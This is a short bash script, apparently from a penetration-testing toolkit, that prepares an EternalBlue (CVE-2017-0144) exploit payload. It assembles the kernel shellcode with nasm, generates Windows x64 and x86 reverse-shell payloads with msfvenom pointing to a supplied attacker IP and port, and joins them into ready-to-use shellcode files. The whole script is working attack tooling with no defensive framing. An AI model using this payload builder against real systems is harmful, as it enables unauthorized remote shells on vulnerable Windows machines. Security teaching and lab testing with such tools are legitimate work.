#!/bin/bash
set -e

host_IP=$1
Listen_port=$2

nasm -f bin /usr/share/ddt/CVE-2017-0144/Shellcode/eternalblue_kshellcode_x64.asm -o /home/kali/Deakin-Detonator-Toolkit/sc_x64_kernel.bin
nasm -f bin /usr/share/ddt/CVE-2017-0144/Shellcode/eternalblue_kshellcode_x86.asm -o /home/kali/Deakin-Detonator-Toolkit/sc_x86_kernel.bin

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /home/kali/Deakin-Detonator-Toolkit/sc_x64_msf.bin EXITFUNC=thread LHOST=$1 LPORT=$2
msfvenom -p windows/shell_reverse_tcp -f raw -o /home/kali/Deakin-Detonator-Toolkit/sc_x86_msf.bin EXITFUNC=thread LHOST=$1 LPORT=$2
        
cat /home/kali/Deakin-Detonator-Toolkit/sc_x64_kernel.bin /home/kali/Deakin-Detonator-Toolkit/sc_x64_msf.bin > /home/kali/Deakin-Detonator-Toolkit/sc_x64.bin
cat /home/kali/Deakin-Detonator-Toolkit/sc_x86_kernel.bin /home/kali/Deakin-Detonator-Toolkit/sc_x86_msf.bin > /home/kali/Deakin-Detonator-Toolkit/sc_x86.bin

echo IP: $1
echo port: $2

exit 0


